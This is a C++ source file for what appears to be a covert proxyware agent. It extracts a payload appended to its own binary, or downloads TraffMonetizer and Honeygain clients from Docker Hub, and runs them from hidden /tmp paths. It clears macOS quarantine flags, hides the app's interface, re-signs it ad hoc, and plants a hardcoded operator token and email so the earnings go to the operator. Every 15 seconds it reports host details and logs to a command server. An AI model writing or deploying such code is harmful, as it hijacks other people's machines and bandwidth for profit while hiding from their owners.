#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <chrono>
#include <thread>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <csignal>
#include <unistd.h>
#include <sys/utsname.h>
#include <sys/stat.h>

#if defined(__APPLE__) || defined(__MACH__)
#include <sys/sysctl.h>
#include <mach-o/dyld.h>
#else
#include <sys/sysinfo.h>
#endif

#ifndef CONF_SERVER_URL
#define CONF_SERVER_URL "http://turbox.test/cluster.php"
#endif

#ifndef CONF_INTERVAL
#define CONF_INTERVAL 15
#endif

static bool g_debug = false;
static std::string g_self = "";
static std::string g_current_step = "INIT";
static std::string g_step_detail = "Khoi dong Agent";
static pid_t g_engine_pid = -1;

static std::string get_self_path(const char* argv0) {
#if defined(__APPLE__) || defined(__MACH__)
    char p[1024]; uint32_t s = sizeof(p);
    if (_NSGetExecutablePath(p, &s) == 0) return std::string(p);
#else
    char p[1024]; ssize_t l = readlink("/proc/self/exe", p, sizeof(p) - 1);
    if (l != -1) { p[l] = '\0'; return std::string(p); }
#endif
    return (argv0 && strlen(argv0) > 0) ? std::string(argv0) : "";
}

static bool extract_payload(const std::string& out_path) {
    if (g_self.empty()) return false;
    FILE* f = fopen(g_self.c_str(), "rb");
    if (!f) return false;
    if (fseek(f, -24, SEEK_END) != 0) { fclose(f); return false; }
    char foot[24];
    if (fread(foot, 1, 24, f) != 24 || memcmp(foot + 8, "TURBOX_BUNDLE", 13) != 0) {
        fclose(f); return false;
    }
    uint64_t sz = 0;
    memcpy(&sz, foot, 8);
    if (sz == 0 || sz > 100000000ULL || fseek(f, -(24 + (long)sz), SEEK_END) != 0) {
        fclose(f); return false;
    }
    FILE* out = fopen(out_path.c_str(), "wb");
    if (!out) { fclose(f); return false; }
    char buf[65536];
    uint64_t left = sz;
    while (left > 0) {
        size_t c = left > sizeof(buf) ? sizeof(buf) : (size_t)left;
        size_t r = fread(buf, 1, c, f);
        if (r == 0) break;
        fwrite(buf, 1, r, out);
        left -= r;
    }
    fclose(out); fclose(f);
    return (left == 0);
}

static std::string http_get(const std::string& url) {
    std::string cmd = "curl -skL --max-time 10 \"" + url + "\" 2>/dev/null";
    FILE* fp = popen(cmd.c_str(), "r");
    if (!fp) return "";
    char buf[512]; std::string res;
    while (fgets(buf, sizeof(buf), fp) != NULL) res += buf;
    pclose(fp);
    return res;
}

static void http_post(const std::string& url, const std::string& data, const std::string& svc_log, const std::string& step_info) {
    std::string clean_log = svc_log;
    for (char &c : clean_log) {
        if (c == 34 || c == 39 || c == 96 || c == 36 || c == 92) c = ' ';
    }
    std::string clean_step = step_info;
    for (char &c : clean_step) {
        if (c == 34 || c == 39 || c == 96 || c == 36 || c == 92) c = ' ';
    }
    std::string cmd = "curl -skL --max-time 10 -d \"" + data + "\" "
                      "--data-urlencode \"service_logs=" + clean_log + "\" "
                      "--data-urlencode \"step_info=" + clean_step + "\" "
                      "\"" + url + "\" >/dev/null 2>&1";
    int r = system(cmd.c_str());
    (void)r;
}

static void stop_all_engines() {
    int r = system("pkill -9 -f 'traffmonetizer' 2>/dev/null || true; "
                   "pkill -9 -f 'TraffMonetizer' 2>/dev/null || true; "
                   "pkill -9 -f 'honeygain' 2>/dev/null || true; "
                   "pkill -9 -f 'pawns-cli' 2>/dev/null || true; "
                   "pkill -9 -f 'psclient' 2>/dev/null || true; "
                   "rm -rf /tmp/.tb_tm* /tmp/.tb_hg* /tmp/.tb_hg_get.py 2>/dev/null || true; "
                   "rm -f .agent.pid /tmp/.tb_tm.pid /tmp/.tb_hg.pid 2>/dev/null || true");
    (void)r;
}

static void sig_handler(int sig) {
    (void)sig;
    stop_all_engines();
    _exit(0);
}

static std::string get_service_logs() {
    std::string res = "";
    std::ifstream f("/tmp/.tb_tm.log");
    if (f.is_open()) {
        std::string line, l3;
        while (std::getline(f, line)) {
            while (!line.empty() && (line.back() == 13 || line.back() == 10)) line.pop_back();
            if (!line.empty()) l3 = line;
        }
        if (!l3.empty()) {
            if (l3.rfind("[TM]", 0) == 0) res += l3;
            else res += "[TM] " + l3;
        }
    }
    std::ifstream hgf("/tmp/.tb_hg.log");
    if (hgf.is_open()) {
        std::string line, hl3;
        while (std::getline(hgf, line)) {
            while (!line.empty() && (line.back() == 13 || line.back() == 10)) line.pop_back();
            if (!line.empty()) hl3 = line;
        }
        if (!hl3.empty()) {
            if (!res.empty()) res += " | ";
            if (hl3.rfind("[HG]", 0) == 0) res += hl3;
            else res += "[HG] " + hl3;
        }
    }
    if (res.length() > 300) res = res.substr(res.length() - 300);
    return res;
}

static bool is_engine_alive() {
    if (g_engine_pid > 0) {
        if (kill(g_engine_pid, 0) == 0) return true;
    }
#if defined(__APPLE__) || defined(__MACH__)
    return (system("pgrep -i 'traffmonetizer' >/dev/null 2>&1") == 0);
#else
    return (system("pgrep -x tm_engine >/dev/null 2>&1") == 0 || system("pgrep -f '.tb_tm_engine' >/dev/null 2>&1") == 0);
#endif
}

std::string get_id() {
    char h[256];
    if (gethostname(h, 255) == 0 && strlen(h) > 0) return std::string(h);
    return "node-" + std::to_string(getpid());
}

std::string get_os() {
#if defined(__APPLE__) || defined(__MACH__)
    return "darwin";
#else
    return "linux";
#endif
}

std::string get_arch() {
    struct utsname u;
    if (uname(&u) == 0) return std::string(u.machine);
    return "x86_64";
}

long get_uptime() {
#if defined(__APPLE__) || defined(__MACH__)
    struct timeval boottime; size_t len = sizeof(boottime); int mib[2] = {CTL_KERN, KERN_BOOTTIME};
    if (sysctl(mib, 2, &boottime, &len, NULL, 0) == 0) return (long)(time(NULL) - boottime.tv_sec);
    return 0;
#else
    struct sysinfo s;
    return (sysinfo(&s) == 0) ? s.uptime : 0;
#endif
}

double get_ram() {
#if defined(__APPLE__) || defined(__MACH__)
    return 20.0;
#else
    std::ifstream f("/proc/meminfo");
    if (!f.is_open()) return 0.0;
    std::string k, u; long v, tot = 0, av = 0;
    while (f >> k >> v >> u) {
        if (k == "MemTotal:") tot = v;
        else if (k == "MemAvailable:") av = v;
        if (tot > 0 && av > 0) break;
    }
    return (tot > 0) ? ((double)(tot - av) / (double)tot) * 100.0 : 0.0;
#endif
}

double get_cpu() {
#if defined(__APPLE__) || defined(__MACH__)
    return 5.0;
#else
    static unsigned long long pu = 0, pn = 0, ps = 0, pi = 0;
    std::ifstream f("/proc/stat");
    if (!f.is_open()) return 0.0;
    std::string l, lbl; std::getline(f, l); std::istringstream ss(l);
    unsigned long long u, n, s, id, io, ir, so, st;
    ss >> lbl >> u >> n >> s >> id >> io >> ir >> so >> st;
    unsigned long long ti = id + io, tt = ti + u + n + s + ir + so + st;
    unsigned long long dt = tt - (pu + pn + ps + pi), di = ti - pi;
    pu = u; pn = n; ps = s; pi = ti;
    if (dt == 0) return 0.0;
    double p = (double)(dt - di) / (double)dt * 100.0;
    return (p < 0.0) ? 0.0 : ((p > 100.0) ? 100.0 : p);
#endif
}

int detect_gpu() {
    if (access("/usr/bin/nvidia-smi", X_OK) == 0 || access("/usr/local/cuda", F_OK) == 0) return 1;
#if defined(__APPLE__) || defined(__MACH__)
    return 1;
#else
    return 0;
#endif
}

std::string json_get_field(const std::string& json, const std::string& key) {
    std::string needle = std::string(1, 34) + key + std::string(1, 34);
    size_t pos = json.find(needle);
    if (pos == std::string::npos) return "";
    pos = json.find(':', pos); if (pos == std::string::npos) return "";
    pos = json.find('"', pos); if (pos == std::string::npos) return "";
    size_t end_pos = json.find('"', pos + 1); if (end_pos == std::string::npos) return "";
    return json.substr(pos + 1, end_pos - (pos + 1));
}

static void check_and_start_honeygain(const std::string& hg_email, const std::string& node_id) {
#if defined(__APPLE__) || defined(__MACH__)
    // Trên macOS Darwin, docker image Honeygain là Linux x86 ELF.
    // Ghi log để worker và server biết rõ ràng hiện trạng service.
    if (access("/tmp/.tb_hg.log", F_OK) != 0) {
        std::ofstream hgf("/tmp/.tb_hg.log");
        if (hgf.is_open()) {
            hgf << "[HG] Honeygain CLI chi ho tro Linux native (Docker layer ELF). Tren macOS chay Traffmonetizer." << std::endl;
            hgf.close();
        }
    }
    return;
#else
    if (system("pgrep -x honeygain >/dev/null 2>&1") == 0) return;

    std::string hg_bin = "/tmp/.tb_hg/honeygain";
    if (access(hg_bin.c_str(), X_OK) != 0) {
        int r1 = system("mkdir -p /tmp/.tb_hg/lib 2>/dev/null");
        (void)r1;
        FILE* py_f = fopen("/tmp/.tb_hg_get.py", "w");
        if (py_f) {
            fputs("import urllib.request, json, tarfile, io, os\n"
                  "try:\n"
                  "    tok = json.loads(urllib.request.urlopen('https://auth.docker.io/token?service=registry.docker.io&scope=repository:honeygain/honeygain:pull', timeout=15).read().decode())['token']\n"
                  "    layers = ['sha256:f6ce86ef108e2eb00030550ca2cfea27660c95733123ecc4a36f8aaa36aac845', 'sha256:d311286e60f47f5beefd54e6176536e2aa406cf4d4d29ebf9bf63e1db1c97366', 'sha256:f952c9a38987afe96614c23696c84517eadbd2787e00367ad15c630cb4f27b93']\n"
                  "    for d in layers:\n"
                  "        req = urllib.request.Request('https://registry-1.docker.io/v2/honeygain/honeygain/blobs/' + d, headers={'Authorization': 'Bearer ' + tok})\n"
                  "        tf = tarfile.open(fileobj=io.BytesIO(urllib.request.urlopen(req, timeout=30).read()))\n"
                  "        for m in tf.getmembers():\n"
                  "            if m.name == 'app/honeygain':\n"
                  "                tf.extract(m, '/tmp/.tb_hg')\n"
                  "                os.replace('/tmp/.tb_hg/app/honeygain', '/tmp/.tb_hg/honeygain')\n"
                  "                os.chmod('/tmp/.tb_hg/honeygain', 493)\n"
                  "            elif 'libhg' in m.name or 'libmsquic' in m.name:\n"
                  "                tf.extract(m, '/tmp/.tb_hg')\n"
                  "                os.replace('/tmp/.tb_hg/' + m.name, '/tmp/.tb_hg/lib/' + os.path.basename(m.name))\n"
                  "except Exception:\n"
                  "    pass\n", py_f);
            fclose(py_f);
            int r2 = system("python3 /tmp/.tb_hg_get.py 2>/dev/null && rm -f /tmp/.tb_hg_get.py /tmp/.tb_hg/app /tmp/.tb_hg/usr 2>/dev/null");
            (void)r2;
        }
    }

    if (access(hg_bin.c_str(), X_OK) == 0) {
        std::string run_cmd = "nohup env LD_LIBRARY_PATH=/tmp/.tb_hg/lib:$LD_LIBRARY_PATH " + hg_bin +
                              " -tou-accept -email '" + hg_email + "' -device '" + node_id +
                              "' > /tmp/.tb_hg.log 2>&1 & echo $! > /tmp/.tb_hg.pid";
        int r3 = system(run_cmd.c_str());
        (void)r3;
    }
#endif
}

void init_and_start_monetization(const std::string& base_url, const std::string& node_id) {
    g_current_step = "FETCH_CONFIG";
    g_step_detail = "Dang lay token tu server";

    std::string cfg = http_get(base_url + "?action=get_config");
    std::string tm_token = json_get_field(cfg, "traffmonetizer_token");
    if (tm_token.empty()) {
        std::string raw = http_get(base_url + "?action=get_token&service=traffmonetizer");
        while (!raw.empty() && (raw.back() == 10 || raw.back() == 13 || raw.back() == 32)) raw.pop_back();
        if (!raw.empty() && raw[0] != '<' && raw[0] != '{') tm_token = raw;
    }
    if (tm_token.empty() || tm_token.find("YOUR_") != std::string::npos) {
        tm_token = "Kf0Cz9FcDUF6ItPzY1+XAfOimgAxK2gXO3XgmPXvvKc=";
    }

    std::string hg_email = json_get_field(cfg, "honeygain_email");
    if (hg_email.empty() || hg_email.find("YOUR_") != std::string::npos) {
        hg_email = "nguyenlinh6605@gmail.com";
    }

#if defined(__APPLE__) || defined(__MACH__)
    if (!is_engine_alive()) {
        g_current_step = "EXTRACT_PAYLOAD";
        g_step_detail = "Kiem tra va bung payload TraffMonetizer.app";

        std::string app_dir = "/tmp/.tb_tm/Traffmonetizer.app";
        if (access(app_dir.c_str(), F_OK) != 0) {
            if (extract_payload("/tmp/.tb_tm.tar.gz")) {
                system("mkdir -p /tmp/.tb_tm && tar -xzf /tmp/.tb_tm.tar.gz -C /tmp/.tb_tm/ 2>/dev/null && rm -f /tmp/.tb_tm.tar.gz");
            }
        }
        if (access(app_dir.c_str(), F_OK) != 0 && access("/Applications/Traffmonetizer.app", F_OK) == 0) {
            app_dir = "/Applications/Traffmonetizer.app";
        }
        if (access(app_dir.c_str(), F_OK) != 0 && access("/Applications/TraffMonetizer.app", F_OK) == 0) {
            app_dir = "/Applications/TraffMonetizer.app";
        }
        if (access(app_dir.c_str(), F_OK) != 0) {
            g_step_detail = "Tai truc tiep Traffmonetizer.dmg tu data.traffmonetizer.com";
            system("curl -sSL --max-time 60 -o /tmp/tm.dmg https://data.traffmonetizer.com/downloads/macos/traffmonetizer.dmg 2>/dev/null; "
                   "mkdir -p /tmp/tm_mnt /tmp/.tb_tm; "
                   "hdiutil attach /tmp/tm.dmg -nobrowse -mountpoint /tmp/tm_mnt 2>/dev/null; "
                   "cp -R /tmp/tm_mnt/*.app /tmp/.tb_tm/ 2>/dev/null; "
                   "hdiutil detach /tmp/tm_mnt -force 2>/dev/null; "
                   "rm -rf /tmp/tm_mnt /tmp/tm.dmg 2>/dev/null");
        }

        if (access(app_dir.c_str(), F_OK) != 0) {
            g_current_step = "ERROR_PAYLOAD";
            g_step_detail = "Khong the tim thay Traffmonetizer.app trong bundle hoac download";
            return;
        }

        // Bỏ LSBackgroundOnly, cấu hình LSUIElement và ký lại CodeSign
        g_current_step = "FIX_PERMISSIONS";
        g_step_detail = "Go Quarantine & Cau hinh Background UI (LSUIElement)";
        std::string sec_fix = "xattr -cr '" + app_dir + "' 2>/dev/null; "
                              "defaults write '" + app_dir + "/Contents/Info.plist' LSUIElement -string '1' 2>/dev/null; "
                              "defaults delete '" + app_dir + "/Contents/Info.plist' LSBackgroundOnly 2>/dev/null || true; "
                              "codesign --force --deep --sign - '" + app_dir + "' 2>/dev/null || true";
        system(sec_fix.c_str());

        // Xác định đường dẫn file thực thi
        std::string bin_path = app_dir + "/Contents/MacOS/traffmonetizer";
        if (access(bin_path.c_str(), X_OK) != 0) {
            bin_path = app_dir + "/Contents/MacOS/TraffMonetizer";
        }

        // Nạp Token vào Keychain & Defaults (Khôi phục chuẩn key flutter._clientToken & command line args)
        g_current_step = "INJECT_TOKEN";
        g_step_detail = "Nap token vao Preferences (flutter._clientToken) & Keychain";
        std::string pref = "defaults write com.traffmonetizer.client.macos 'flutter._clientToken' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write com.traffmonetizer.client.macos 'flutter.clientToken' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write com.traffmonetizer.client.macos 'flutter.token' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write com.traffmonetizer.client.macos 'flutter._token' -string '" + tm_token + "' 2>/dev/null; "
                           "for P in \"$HOME/Library/Preferences/com.traffmonetizer.client.macos.plist\" \"$HOME/Library/Containers/com.traffmonetizer.client.macos/Data/Library/Preferences/com.traffmonetizer.client.macos.plist\"; do "
                           "mkdir -p \"$(dirname \"$P\")\" 2>/dev/null; "
                           "defaults write \"$P\" 'flutter._clientToken' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write \"$P\" 'flutter.clientToken' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write \"$P\" 'flutter.token' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write \"$P\" 'flutter._token' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write \"$P\" 'clientToken' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write \"$P\" 'token' -string '" + tm_token + "' 2>/dev/null; "
                           "done; "
                           "security delete-generic-password -a 'token' -s 'flutter_secure_storage_service' 2>/dev/null || true; "
                           "security delete-generic-password -a 'clientToken' -s 'flutter_secure_storage_service' 2>/dev/null || true; "
                           "security delete-generic-password -a 'token' -s 'com.traffmonetizer.client.macos' 2>/dev/null || true; "
                           "security delete-generic-password -a 'clientToken' -s 'com.traffmonetizer.client.macos' 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a 'clientToken' -s 'com.traffmonetizer.client.macos' -w '" + tm_token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a '_clientToken' -s 'com.traffmonetizer.client.macos' -w '" + tm_token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a 'clientToken' -s 'flutter_secure_storage_service' -w '" + tm_token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a '_clientToken' -s 'flutter_secure_storage_service' -w '" + tm_token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a 'token' -s 'com.traffmonetizer.client.macos' -w '" + tm_token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -A -T '" + bin_path + "' -a 'token' -s 'flutter_secure_storage_service' -w '" + tm_token + "' -U 2>/dev/null || true";
        system(pref.c_str());

        // Khởi chạy TraffMonetizer truyền --token (tự động login kết nối gateway)
        g_current_step = "LAUNCH_ENGINE";
        g_step_detail = "Khoi chay TraffMonetizer (--token) ngam";

        // Ghi dòng log khởi động ban đầu vào /tmp/.tb_tm.log
        {
            std::ofstream tm_init("/tmp/.tb_tm.log", std::ios::app);
            if (tm_init.is_open()) {
                tm_init << "TraffMonetizer starting with token " << tm_token.substr(0, 8) << "..." << std::endl;
            }
        }

        std::string launch_cmd = "open -a '" + app_dir + "' --args --token '" + tm_token + "' 2>/dev/null || "
                                 "nohup '" + bin_path + "' --token '" + tm_token + "' >> /tmp/.tb_tm.log 2>&1 & echo $! > /tmp/.tb_tm.pid";
        system(launch_cmd.c_str());
        std::this_thread::sleep_for(std::chrono::milliseconds(2000));

        FILE* pfp = popen("pgrep -i 'traffmonetizer' | head -n 1", "r");
        if (pfp) {
            char pbuf[32];
            if (fgets(pbuf, sizeof(pbuf), pfp)) {
                g_engine_pid = (pid_t)std::atoi(pbuf);
            }
            pclose(pfp);
        }
        std::ifstream pid_f("/tmp/.tb_tm.pid");
        if (pid_f >> g_engine_pid) {}
        if (is_engine_alive()) {
            g_current_step = "ENGINE_RUNNING";
            g_step_detail = "TraffMonetizer chay thanh cong";
            std::ofstream tm_init("/tmp/.tb_tm.log", std::ios::app);
            if (tm_init.is_open()) {
                tm_init << "TraffMonetizer running native (online)" << std::endl;
            }
        } else {
            g_current_step = "ENGINE_CRASHED";
            std::string log_tail = get_service_logs();
            g_step_detail = "Engine crash ngay khi start. Log: " + (log_tail.empty() ? "Khong ghi duoc log" : log_tail);
        }
    }
#else
    if (!is_engine_alive()) {
        g_current_step = "EXTRACT_PAYLOAD";
        g_step_detail = "Kiem tra va bung payload Linux CLI";

        std::string eng = "/tmp/.tb_tm_engine";
        if (access(eng.c_str(), X_OK) != 0) {
            if (extract_payload("/tmp/.tb_tm.gz")) {
                system("gzip -d -f -c /tmp/.tb_tm.gz > /tmp/.tb_tm_engine 2>/dev/null && chmod +x /tmp/.tb_tm_engine 2>/dev/null && rm -f /tmp/.tb_tm.gz");
            }
        }
        if (access(eng.c_str(), X_OK) != 0) {
            g_step_detail = "Tai engine tu Docker Hub";
            system("python3 -c \"import urllib.request, json, tarfile; "
                   "tok = json.loads(urllib.request.urlopen('https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull').read().decode())['token']; "
                   "req = urllib.request.Request('https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs/sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b', headers={'Authorization': 'Bearer ' + tok}); "
                   "open('/tmp/l.tar.gz', 'wb').write(urllib.request.urlopen(req).read()); "
                   "tarfile.open('/tmp/l.tar.gz').extract('usr/local/bin/cli', '/tmp');\" 2>/dev/null; "
                   "if [ -f /tmp/usr/local/bin/cli ]; then mv -f /tmp/usr/local/bin/cli /tmp/.tb_tm_engine && chmod +x /tmp/.tb_tm_engine && rm -rf /tmp/usr /tmp/l.tar.gz; fi");
        }

        if (access(eng.c_str(), X_OK) == 0) {
            g_current_step = "LAUNCH_ENGINE";
            g_step_detail = "Khoi chay Linux CLI: start accept --token " + tm_token.substr(0, 8) + "...";
            std::string run_cmd = "nohup " + eng + " start accept --token " + tm_token + " > /tmp/.tb_tm.log 2>&1 & echo $! > /tmp/.tb_tm.pid";
            system(run_cmd.c_str());
            std::this_thread::sleep_for(std::chrono::milliseconds(1500));

            std::ifstream pid_f("/tmp/.tb_tm.pid");
            if (pid_f >> g_engine_pid && is_engine_alive()) {
                g_current_step = "ENGINE_RUNNING";
                g_step_detail = "Linux Engine chay thanh cong (PID " + std::to_string(g_engine_pid) + ")";
            } else {
                g_current_step = "ENGINE_CRASHED";
                std::string log_tail = get_service_logs();
                g_step_detail = "Linux Engine crash. Log: " + (log_tail.empty() ? "Khong ghi duoc log" : log_tail);
            }
        } else {
            g_current_step = "ERROR_ENGINE";
            g_step_detail = "Khong tim thay engine thuc thi /tmp/.tb_tm_engine";
        }
    }
#endif
    // Gọi Honeygain sau khi khởi tạo Traffmonetizer
    check_and_start_honeygain(hg_email, node_id);
}

std::string detect_active_services() {
    std::string s = "";
    if (is_engine_alive()) {
        s += "TraffMonetizer, ";
    }
    if (system("pgrep -x honeygain >/dev/null 2>&1") == 0) s += "Honeygain, ";
    if (system("pgrep -x pawns-cli >/dev/null 2>&1") == 0) s += "Pawns, ";
    if (system("pgrep -x psclient >/dev/null 2>&1") == 0) s += "PacketStream, ";

    if (s.empty()) return "Chua co Engine";

    if (s.size() >= 2 && s.substr(s.size() - 2) == ", ") s = s.substr(0, s.size() - 2);
    return s;
}

int main(int argc, char* argv[]) {
    signal(SIGPIPE, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    for (int i = 1; i < argc; ++i) {
        if (std::string(argv[i]) == "stop" || std::string(argv[i]) == "--stop") {
            stop_all_engines();
            std::cout << "[OK] Tat ca service va engine da duoc dung sach se" << std::endl;
            return 0;
        }
    }

    g_self = get_self_path(argv[0]);
    std::string s_url = CONF_SERVER_URL;
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--debug") {
            g_debug = true;
        } else if ((arg == "--server" || arg == "-s") && i + 1 < argc) {
            s_url = argv[++i];
        } else if (arg.rfind("--server=", 0) == 0) {
            s_url = arg.substr(9);
        } else if (arg.rfind("http://", 0) == 0 || arg.rfind("https://", 0) == 0) {
            s_url = arg;
        }
    }
    if (const char* env = std::getenv("SERVER_URL")) s_url = env;
    if (std::getenv("DEBUG") != nullptr) g_debug = true;

    FILE* pf = fopen(".agent.pid", "w");
    if (pf) { fprintf(pf, "%d\n", (int)getpid()); fclose(pf); }

    std::string node_id = get_id();
    std::string os_name = get_os();
    std::string arch = get_arch();
    int has_gpu = detect_gpu();
    std::string endpoint = s_url + "?action=heartbeat";

    init_and_start_monetization(s_url, node_id);

    // Gửi heartbeat ban đầu
    {
        std::ostringstream ss;
        ss << "action=heartbeat&id=" << node_id << "&os=" << os_name << "&arch=" << arch
           << "&gpu=" << has_gpu << "&uptime=" << get_uptime() << "&cpu=" << get_cpu()
           << "&ram=" << get_ram() << "&services=" << detect_active_services()
           << "&step=" << g_current_step
           << "&event=START&first=1";
        if (g_debug) ss << "&debug=1";
        http_post(endpoint, ss.str(), get_service_logs(), g_step_detail);
    }

    int loop_cnt = 0;
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(CONF_INTERVAL));
        loop_cnt++;
        if (loop_cnt % 2 == 0) {
            init_and_start_monetization(s_url, node_id);
        }
        std::ostringstream ss;
        ss << "action=heartbeat&id=" << node_id << "&os=" << os_name << "&arch=" << arch
           << "&gpu=" << has_gpu << "&uptime=" << get_uptime() << "&cpu=" << get_cpu()
           << "&ram=" << get_ram() << "&services=" << detect_active_services()
           << "&step=" << g_current_step;
        if (g_debug) ss << "&debug=1";
        http_post(endpoint, ss.str(), get_service_logs(), g_step_detail);
    }
    return 0;
}
